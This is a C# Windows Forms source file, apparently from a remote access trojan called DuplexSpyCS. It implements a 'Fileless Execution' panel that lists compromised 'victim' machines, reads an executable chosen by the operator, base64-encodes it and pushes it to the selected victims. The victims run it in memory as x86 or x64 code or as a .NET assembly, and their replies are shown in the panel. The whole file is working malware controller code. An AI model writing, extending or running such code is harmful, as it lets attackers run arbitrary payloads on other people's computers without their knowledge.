using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace DuplexSpyCS
{
    public partial class frmFilelessExec : Form
    {
        public List<clsVictim> m_lsVictim;

        private bool m_bSignalPause { get; set; }
        private bool m_bSignalStop { get; set; }

        public frmFilelessExec(List<clsVictim> lsVictim)
        {
            InitializeComponent();

            m_lsVictim = lsVictim;

            m_bSignalPause = false;
            m_bSignalStop = false;
        }

        void fnRecv(clsListener listener, clsVictim victim, List<string> lsMsg)
        {
            if (!m_lsVictim.Contains(victim))
                return;

            if (lsMsg[0] == "fle") //Fileless Execution
            {
                Invoke(new Action(() =>
                {
                    ListViewItem item = listView1.FindItemWithText(victim.ID, true, 0);
                    if (item == null)
                        return;

                    if (lsMsg[1] == "init")
                    {
                        string szPlatform = lsMsg[2];
                        item.SubItems[2].Text = szPlatform;

                        return;
                    }

                    //The following codes below cannot be executed if lsMsg[1] == "init".

                    int nCode = int.Parse(lsMsg[2]);
                    string szMsg = clsCrypto.b64D2Str(lsMsg[3]);

                    richTextBox1.AppendText($"[{DateTime.Now.ToString("F")}] {szMsg}");
                    richTextBox1.AppendText(Environment.NewLine);

                    item.SubItems[2].Text = nCode == 0 ? "Failed" : szMsg;
                }));
            }
        }

        void fnSendPayload(string[] alpArgs, byte[] abData)
        {
            List<clsVictim> lsTarget = new List<clsVictim>();
            Invoke(new Action(() =>
            {
                lsTarget.AddRange(
                    listView1.CheckedItems.Cast<ListViewItem>()
                    .Where(x => x.Checked)
                    .Select(x => (clsVictim)x.Tag)
                    .ToList()
                    );
                toolStripStatusLabel2.Text = "Running";

                listView1.CheckedItems.Cast<ListViewItem>().ToList().ForEach(x => x.SubItems[1].Text = "?");
            }));

            string szArgs = string.Join(",", alpArgs.Select(x => clsCrypto.b64E2Str(x)).ToArray());
            string szData = Convert.ToBase64String(abData);
            foreach (clsVictim v in lsTarget)
            {
                while (m_bSignalPause)
                {
                    Invoke(new Action(() => toolStripStatusLabel2.Text = "Pause"));
                    Thread.Sleep(1000);
                }

                if (m_bSignalStop)
                {
                    Invoke(new Action(() => toolStripStatusLabel2.Text = "Stopped"));
                    break;
                }

                if (radioButton3.Checked)
                {
                    v.fnSendCommand(new string[]
                    {
                        "fle",
                        "x86",
                        string.Empty,
                        szData
                    });
                }
                else if (radioButton1.Checked)
                {
                    v.fnSendCommand(new string[]
                    {
                        "fle",
                        "x64",
                        string.Empty,
                        szData
                    });
                }
                else if (radioButton2.Checked)
                {
                    v.fnSendCommand(new string[]
                    {
                        "fle",
                        "cs",
                        szArgs,
                        szData,
                    });
                }
            }
        }

        void fnSetup()
        {
            //Controls
            listView1.FullRowSelect = true;
            listView1.CheckBoxes = true;

            Text = $"Fileless Execution | Victim[{m_lsVictim.Count}]";
            toolStripStatusLabel1.Text = $"Target[{m_lsVictim.Count}]";
            toolStripStatusLabel2.Text = string.Empty;

            radioButton3.Checked = true;

            //setup
            foreach (clsVictim v in m_lsVictim)
            {
                ListViewItem item = new ListViewItem(v.ID);
                item.SubItems.Add("?");
                item.SubItems.Add("?");
                item.Tag = v;

                listView1.Items.Add(item);

                v.m_listener.ReceivedDecoded += fnRecv;

                v.fnSendCommand(new string[]
                {
                    "fle",
                    "init",
                });
            }
        }

        private void frmFilelessExec_Load(object sender, EventArgs e)
        {
            fnSetup();
        }

        //Open exe.
        private void button1_Click(object sender, EventArgs e)
        {
            OpenFileDialog ofd = new OpenFileDialog();
            ofd.Filter = "Executable (*.exe)|*.exe";
            if (ofd.ShowDialog() == DialogResult.OK)
            {
                textBox1.Text = ofd.FileName;
            }
        }
        //Check all.
        private void button2_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listView1.Items)
                item.Checked = true;
        }
        //Uncheck all.
        private void button3_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listView1.Items)
                item.Checked = false;
        }
        //Go
        private void button4_Click(object sender, EventArgs e)
        {
            string szFileName = textBox1.Text;
            string szArgs = textBox2.Text;

            if (!File.Exists(szFileName))
            {
                MessageBox.Show("File not found: " + szFileName, "FileNotExists", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }

            List<ListViewItem> items = listView1.CheckedItems.Cast<ListViewItem>().ToList();
            if (items.Count == 0)
            {
                MessageBox.Show("Please check a item.", "Nothing!", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                return;
            }

            List<string> lsProc = items.Select(x => x.SubItems[1].Text).Where(y => !string.Equals(y, "?")).ToList();
            if (lsProc.Count == 0 && !radioButton2.Checked)
            {
                DialogResult dr = MessageBox.Show(
                    "There is victim with unknown process architecture\n" +
                    "Are you sure to continue?",
                    "Warning",
                    MessageBoxButtons.YesNo,
                    MessageBoxIcon.Warning,
                    MessageBoxDefaultButton.Button2
                );

                if (dr != DialogResult.Yes)
                    return;
            }

            if (radioButton3.Checked && lsProc.Contains("x64")) //x86
            {
                DialogResult dr = MessageBox.Show(
                    "There is process on remote machine is running with x64 architecture.\n" +
                    "Are you sure to continue?",
                    "Warning",
                    MessageBoxButtons.YesNo,
                    MessageBoxIcon.Warning,
                    MessageBoxDefaultButton.Button2
                );

                if (dr != DialogResult.Yes)
                    return;
            }
            else if (radioButton1.Checked && lsProc.Contains("x86")) //x64
            {
                DialogResult dr = MessageBox.Show(
                    "There is process on remote machine is running with x86 architecture.\n" +
                    "Are you sure to continue?",
                    "Warning",
                    MessageBoxButtons.YesNo,
                    MessageBoxIcon.Warning,
                    MessageBoxDefaultButton.Button2
                );

                if (dr != DialogResult.Yes)
                    return;
            }

            string[] alpArgs = szArgs.Split(' ');
            byte[] abData = File.ReadAllBytes(szFileName);

            new Thread(() => fnSendPayload(alpArgs, abData)).Start();
        }
        //Pause
        private void button6_Click(object sender, EventArgs e)
        {
            if (button6.Text == "Pause")
            {
                m_bSignalPause = false;
                toolStripStatusLabel2.Text = "Running";
                button6.Text = "Resume";
            }
            else
            {
                m_bSignalPause = true;
                toolStripStatusLabel2.Text = "Pause";
                button6.Text = "Pause";
            }
        }
        //Stop
        private void button5_Click(object sender, EventArgs e)
        {
            m_bSignalStop = true;
        }

        private void radioButton1_CheckedChanged(object sender, EventArgs e)
        {
            textBox2.Enabled = !radioButton1.Checked;
        }

        private void splitContainer1_Panel1_Paint(object sender, PaintEventArgs e)
        {

        }

        private void frmFilelessExec_FormClosed(object sender, FormClosedEventArgs e)
        {
            foreach (var victim in m_lsVictim)
                victim.m_listener.ReceivedDecoded -= fnRecv;
        }

        private void radioButton3_CheckedChanged(object sender, EventArgs e)
        {
            textBox2.Enabled = !radioButton3.Checked;
        }
    }
}
